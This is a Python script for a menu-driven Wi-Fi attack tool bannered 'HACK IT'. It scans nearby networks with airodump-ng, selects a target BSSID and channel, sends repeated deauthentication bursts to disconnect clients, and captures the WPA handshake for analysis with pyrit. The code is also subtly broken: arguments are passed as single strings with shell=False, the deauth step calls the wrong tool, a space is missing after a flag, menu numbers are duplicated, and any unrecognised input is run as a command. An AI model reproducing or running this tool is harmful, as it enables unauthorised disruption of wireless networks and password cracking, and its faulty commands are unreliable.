import re
import sched
import subprocess


import time

target_network = "N/A"
channel = "N/A"
bssid = "N/A"


def main():
    subprocess.call("clear", shell=False)
    print_heading()


def print_heading():
    global channel, bssid, target_network
    print("                                                              ")
    print("          /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$|            ")
    print("         | $$  | $$ /$$___ $$ /$$__ $$$| $$  /$$/             ")
    print("         | $$  | $$| $$   \$$| $$  \__/| $$ /$$/              ")
    print("         | $$$$$$$$| $$$$$$$$| $$      | $$$$$/               ")
    print("         | $$__  $$| $$__  $$| $$      | $$  $$               ")
    print("         | $$  | $$| $$  | $$| $$    $$| $$\  $$              ")
    print("         | $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$             ")
    print("         |__/  |__/|__/  |__/ \______/ |__/  \__/             ")
    print("                                                              ")
    print("                    /$$$$$$ /$$$$$$$$                         ")
    print("                   |_  $$_/|__  $$__/                         ")
    print("                      | $$     | $$                           ")
    print("                      | $$     | $$                           ")
    print("                      | $$     | $$                           ")
    print("                      | $$     | $$                           ")
    print("                     /$$$$$$   | $$                           ")
    print("                    |______/   |__/                           ")
    print("                                                              ")
    print("    selected target: " + target_network + "                   ")
    print("              bssid: " + bssid + "                            ")
    print("            channel: " + channel + "                          ")
    print("                                                              ")
    print("                                                              ")
    print("    iw. iwconfig                if. ifconfig                  ")
    print("     1. monitor mode             2. managed mode              ")
    print("     3. select target network    4. capture handshake         ")
    print("     5. generate access point    6. zenmap                    ")
    print("     7.                          8.                           ")
    print("     9.                         10.                           ")
    print("    11.                         12.                           ")
    print("    00. exit                                                  ")
    make_decision()


def make_decision():
    x = input("choice: ")
    if x == "1":
        monitor_mode()
    elif x == "00":
        exit(0)
    elif x == "2":
        managed_mode()
    elif x == "4":
        if bssid == "N/A":
            print("Please select target network first")
        else:
            generate_handshake_capture()
    elif x == "6":
        subprocess.call("zenmap &", shell=False)
    elif x == "iwconfig" or x == "iw":
        subprocess.call("iwconfig", shell=False)
    elif x == "ifconfig" or x == "if":
        subprocess.call("ifconfig", shell=False)
    elif x == "3":
        x = subprocess.call("airodump-ng -w networks.csv --output-format csv wlan0", shell=False)
        print(x)
        with open("networks.csv") as f:
            content = f.readlines()
            content = [x.strip() for x in content]
            content = content[1:]
            index = 0
            for i in range(len(content)):
                if "BSSID" in content[i]:
                    index = i
                    break
            content = content[:index]
            content = list(filter(None, content))
            display_scan_results(content)
    else:
        subprocess.call(x, shell=False)

    x = input('Press (enter) to go return to menu: ')
    if x == "":
        subprocess.call("clear", shell=False)
        print_heading()


def monitor_mode():
    print('starting monitor mode')
    subprocess.call("monitor.sh", shell=False)
    print('monitor mode enabled')


def managed_mode():
    print('starting managed mode')
    subprocess.call("managed.sh", shell=False)
    print('managed mode enabled')


def generate_handshake_capture():
    subprocess.call("clear", shell=False)
    print("     please select deauthentication intervals                 ")
    print("     1. 30 seconds (recommended)                              ")
    print("     3. 60 seconds                                            ")
    print("     3. 90 seconds                                             ")
    print("    00. main menu                                             ")
    deauthtimes = input("choice: ")
    if deauthtimes == "":
        print("defaulting to 30 seconds")
        deauthtime = 30
        run_deauth(deauthtime)
    elif deauthtimes == "00":
        subprocess.call("clear", shell=False)
        print_heading()
    elif deauthtimes == "1":
        print("deauthenticating every 30 seconds")
        deauthtime = 30
        run_deauth(deauthtime)
    elif deauthtimes == "2":
        print("deauthenticating every 60 seconds")
        deauthtime = 60
        run_deauth(deauthtime)
    elif deauthtimes == "3":
        print("deauthenticating every 90 seconds")
        deauthtime = 90
        run_deauth(deauthtime)

def run_deauth(timedelay):
    subprocess.call("clear", shell=False)
    print("acquiring handshake")
    command = "xterm airodump-ng --channel " + channel + " --bssid " + bssid + " -w handshake wlan0"
    print(command)
    subprocess.call(command, shell=False)
    while True:
        deauth()
        time.sleep(timedelay)
        command3 = "xterm pyrit -r handshake-01.cap analyze"
        x = subprocess.call(command3, shell=False)
        print(x)


def deauth():
    command = "xterm aircrack-ng --deauth --channel" + channel + " --bssid " + bssid + " wlan0"
    print(command)
    subprocess.call(command, shell=False)



def display_scan_results(content):
    global target_network, bssid, channel
    subprocess.call("clear", shell=False)
    count = 1
    for line in content:
        line = re.sub( '\s+', ' ', line ).strip()
        line = line[:-1]
        line_string = str(count) + "." + line
        print("    " + line_string + "                                               ")
        count += 1
    print("    00. main menu                                             ")
    y = input("select target network: ")
    if y == "00":
        subprocess.call("clear", shell=False)
        print_heading()
    else:
        selection = re.sub('\s+', ' ', content[int(y) - 1]).strip()[:-1]
        print("selected network: ", selection)
        selection_list = selection.split(",")
        target_network = re.sub('\s+', '', selection_list[-1]).strip()
        bssid = re.sub('\s+', '', selection_list[0]).strip()
        channel = re.sub('\s+', '', selection_list[3]).strip()


if __name__ == '__main__':
    main()
